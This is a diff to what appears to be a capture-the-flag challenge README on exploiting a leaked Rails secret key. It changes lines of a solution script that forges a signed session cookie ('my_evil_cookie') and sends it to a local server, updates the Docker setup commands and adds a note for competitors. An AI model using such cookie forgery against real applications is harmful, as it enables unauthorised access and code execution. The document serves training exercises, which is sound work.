@@ -51,7 +51,7 @@ Solution credit: http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-usin
     my_evil_cookie = "_rails_messaging_app_session=#{unescaped_cookie_value}--#{cookie_signature}"
 
     # BOMBS AWAY
-    url = URI.parse("http://localhost:3000/") # Make sure you have a trailing / if you are sending to the root path
+    url = URI.parse("http://localhost:80/") # Make sure you have a trailing / if you are sending to the root path
 
     req = Net::HTTP::Get.new(url.path)
     req.add_field("Cookie", my_evil_cookie)
@@ -69,7 +69,9 @@ Solution credit: http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-usin
     ...
     docker-compose up --build -d
     # Wait a minute...
-    docker exec -it `docker ps -f "name=secretkeyvulnerability_web" -q` /bin/bash -c "bundle exec rake db:create RAILS_ENV=production && bundle exec rake db:migrate RAILS_ENV=production && bundle exec rake db:seed RAILS_ENV=production"
+    docker-compose run  --rm web /bin/bash -c "bundle exec rake db:create RAILS_ENV=production && bundle exec rake db:migrate RAILS_ENV=production && bundle exec rake db:seed RAILS_ENV=production"
+
+**Competitors will also need to be informed that the file they create needs to have a name longer than 25 characters.**
 
 ## Flag
 
